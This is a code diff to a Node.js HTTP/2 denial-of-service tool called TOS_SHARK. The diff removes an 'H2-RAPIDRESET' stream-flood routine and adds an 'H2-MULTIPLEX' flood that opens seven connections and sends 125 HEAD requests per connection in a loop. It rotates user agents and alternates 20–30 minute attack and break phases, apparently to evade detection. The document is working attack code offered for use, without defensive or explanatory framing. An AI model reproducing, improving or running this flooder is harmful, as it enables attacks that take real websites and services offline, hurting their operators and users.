@@ -19,57 +19,63 @@ class TOS_SHARK {
         this.breakStart = 0;
         this.currentMethod = 'H2-MULTIPLEX';
         
-        this.connections = [];
-        this.h2ResetActive = false;
-        this.lastResetAttack = 0;
-        this.resetInterval = 0;
+        // Attack methods pool - ONLY H2-MULTIPLEX
+        this.methods = ['H2-MULTIPLEX'];
         
+        // Data pools
         this.userAgents = this.generateUserAgents();
-        this.endpoints = this.generateEndpoints();
         
-        this.startAttack();
+        // 7 HTTP/2 connections pool
+        this.connections = [];
+        this.maxConnections = 7;
+        
+        this.startCycle();
     }
 
+    // ===== DATA GENERATORS =====
     generateUserAgents() {
         return [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
+            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
         ];
     }
 
-    generateEndpoints() {
-        return ['/', '/api', '/static', '/users', '/data'];
-    }
-
-    async startAttack() {
-        this.attackActive = true;
-        this.attackStart = Date.now();
+    // ===== CYCLE MANAGEMENT =====
+    async startCycle() {
+        // Step 1: Create 7 HTTP/2 connections
+        this.createConnections();
         
-        // Start H2-RAPIDRESET background attack
-        this.startH2ResetAttack();
-        
-        // Create 5 persistent H2 connections
-        for (let i = 0; i < 5; i++) {
-            this.createConnection();
-        }
-        
-        // Main H2-MULTIPLEX attack loop
+        // Step 2: Main attack loop
         this.attackLoop();
     }
 
-    createConnection() {
-        try {
-            const client = http2.connect(this.target);
-            this.connections.push(client);
-            
-            client.on('error', () => {
-                // Recreate connection if it dies
-                setTimeout(() => this.createConnection(), 1000);
-                this.connections = this.connections.filter(c => c !== client);
-            });
-            
-        } catch (err) {}
+    createConnections() {
+        for (let i = 0; i < this.maxConnections; i++) {
+            try {
+                const client = http2.connect(this.target);
+                this.connections.push(client);
+                
+                // Handle connection errors
+                client.on('error', () => {
+                    // Try to recreate connection
+                    setTimeout(() => {
+                        const idx = this.connections.indexOf(client);
+                        if (idx !== -1) {
+                            try { client.destroy(); } catch(e) {}
+                            try {
+                                const newClient = http2.connect(this.target);
+                                this.connections[idx] = newClient;
+                            } catch(e) {}
+                        }
+                    }, 1000);
+                });
+            } catch (err) {
+                // Connection failed, will retry later
+            }
+        }
     }
 
     async attackLoop() {
@@ -77,30 +83,23 @@ class TOS_SHARK {
             const now = Date.now();
             
             if (this.attackActive) {
+                // Attack phase (20-30 minutes)
                 if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                     this.startBreak();
                     continue;
                 }
                 
-                // Use all 5 connections simultaneously
-                for (const client of this.connections) {
-                    if (client && !client.destroyed) {
-                        this.attackH2Multiplex(client);
-                    }
-                }
-                
-                // Background H2-RAPIDRESET check
-                if (!this.h2ResetActive && now - this.lastResetAttack >= this.resetInterval) {
-                    this.startH2ResetAttack();
-                }
+                // Execute H2-MULTIPLEX with 7 connections
+                await this.attackH2Multiplex();
                 
             } else {
+                // Break phase (20-30 minutes)
                 if (now - this.breakStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
-                    this.attackActive = true;
-                    this.attackStart = Date.now();
+                    this.startAttack();
                     continue;
                 }
                 
+                // Maintenance during break
                 await this.performMaintenance();
                 await this.sleepRandom(1000, 3000);
             }
@@ -109,148 +108,86 @@ class TOS_SHARK {
         }
     }
 
+    startAttack() {
+        this.attackActive = true;
+        this.attackStart = Date.now();
+    }
+
     startBreak() {
         this.attackActive = false;
         this.breakStart = Date.now();
         
-        // Clean up connections
+        // Clean up connections during break
+        this.cleanupConnections();
+    }
+
+    // ===== ATTACK METHOD =====
+    async attackH2Multiplex() {
+        // Use all 7 connections
         for (const client of this.connections) {
-            try {
-                client.destroy();
-            } catch (e) {}
-        }
-        this.connections = [];
-        
-        if (global.gc) global.gc();
-    }
-
-    attackH2Multiplex(client) {
-        if (!client || client.destroyed) return;
-        
-        const methods = ['HEAD', 'GET', 'OPTIONS'];
-        
-        // Send 125 requests per stream
-        for (let i = 0; i < 125; i++) {
-            const method = methods[Math.floor(Math.random() * methods.length)];
-            
-            try {
-                const req = client.request({
-                    ':method': method,
-                    ':path': '/',
-                    ':authority': this.host,
-                    'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
-                });
-                
-                req.on('response', (headers) => {
-                    this.logStatus(headers[':status']);
-                    req.destroy();
-                });
-                
-                req.on('error', () => {
-                    this.logStatus('*.*');
-                    req.destroy();
-                });
-                
-                req.end();
-                
-                this.totalReqs++;
-                this.reqCounter++;
-                
-            } catch (err) {
-                this.logStatus('*.*');
-                this.totalReqs++;
-                this.reqCounter++;
+            if (client && !client.destroyed && client.socket && !client.socket.destroyed) {
+                // Send 125 HEAD requests per connection
+                for (let i = 0; i < 125; i++) {
+                    this.sendH2HeadRequest(client);
+                    this.totalReqs++;
+                    this.reqCounter++;
+                }
             }
         }
     }
 
-    startH2ResetAttack() {
-        if (this.h2ResetActive) return;
-        
-        this.h2ResetActive = true;
-        this.lastResetAttack = Date.now();
-        this.resetInterval = (120 + Math.random() * 180) * 1000; // 120-300s
-        
-        // Execute H2-RAPIDRESET attack in background
-        setTimeout(() => {
-            this.executeH2ResetAttack();
-        }, 0);
-    }
-
-    executeH2ResetAttack() {
+    sendH2HeadRequest(client) {
         try {
-            const client = http2.connect(this.target);
-            
-            // Create 2 streams with 100 requests each
-            const streamPromises = [];
-            
-            for (let s = 0; s < 2; s++) {
-                const streamPromise = new Promise((resolve) => {
-                    setTimeout(() => {
-                        const methods = ['HEAD', 'GET', 'OPTIONS'];
-                        
-                        for (let i = 0; i < 100; i++) {
-                            const method = methods[Math.floor(Math.random() * methods.length)];
-                            
-                            try {
-                                const req = client.request({
-                                    ':method': method,
-                                    ':path': '/',
-                                    ':authority': this.host
-                                });
-                                
-                                req.on('response', (headers) => {
-                                    this.logStatus(headers[':status']);
-                                    req.destroy();
-                                });
-                                
-                                req.on('error', () => {
-                                    this.logStatus('*.*');
-                                    req.destroy();
-                                });
-                                
-                                req.end();
-                                
-                                this.totalReqs++;
-                                this.reqCounter++;
-                                
-                            } catch (err) {
-                                this.logStatus('*.*');
-                                this.totalReqs++;
-                                this.reqCounter++;
-                            }
-                            
-                            // 0.8ms delay between requests
-                            if (i < 99) {
-                                const now = Date.now();
-                                while (Date.now() - now < 0.8) {}
-                            }
-                        }
-                        resolve();
-                    }, s * 10);
-                });
-                
-                streamPromises.push(streamPromise);
-            }
-            
-            Promise.all(streamPromises).then(() => {
-                setTimeout(() => {
-                    try {
-                        client.destroy();
-                    } catch (e) {}
-                    this.h2ResetActive = false;
-                }, 100);
+            const req = client.request({
+                ':method': 'HEAD',
+                ':path': '/',
+                ':authority': this.host,
+                'user-agent': this.userAgents[Math.floor(Math.random() * this.userAgents.length)]
             });
             
+            req.on('response', (headers) => {
+                this.logStatus(headers[':status']);
+                req.destroy();
+            });
+            
+            req.on('error', () => {
+                this.logStatus('*.*');
+                req.destroy();
+            });
+            
+            req.end();
         } catch (err) {
-            this.h2ResetActive = false;
+            this.logStatus('*.*');
         }
     }
 
+    // ===== MAINTENANCE =====
     async performMaintenance() {
+        // Force garbage collection
+        if (global.gc) global.gc();
+        
+        // Rotate user agents
         this.userAgents = this.generateUserAgents();
+        
+        // Recreate connections
+        this.cleanupConnections();
+        this.createConnections();
     }
 
+    cleanupConnections() {
+        for (const client of this.connections) {
+            try {
+                if (client && !client.destroyed) {
+                    client.destroy();
+                }
+            } catch (e) {
+                // Ignore
+            }
+        }
+        this.connections = [];
+    }
+
+    // ===== LOGGING =====
     logStatus(status) {
         const now = Date.now();
         if (now - this.lastLog >= 10000) {
@@ -259,12 +196,18 @@ class TOS_SHARK {
         }
     }
 
+    // ===== UTILS =====
     sleepRandom(min, max) {
         const duration = Math.random() * (max - min) + min;
         return new Promise(resolve => setTimeout(resolve, duration));
     }
+
+    sleep(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
 }
 
+// Run
 if (require.main === module) {
     process.on('uncaughtException', () => {});
     process.on('unhandledRejection', () => {});
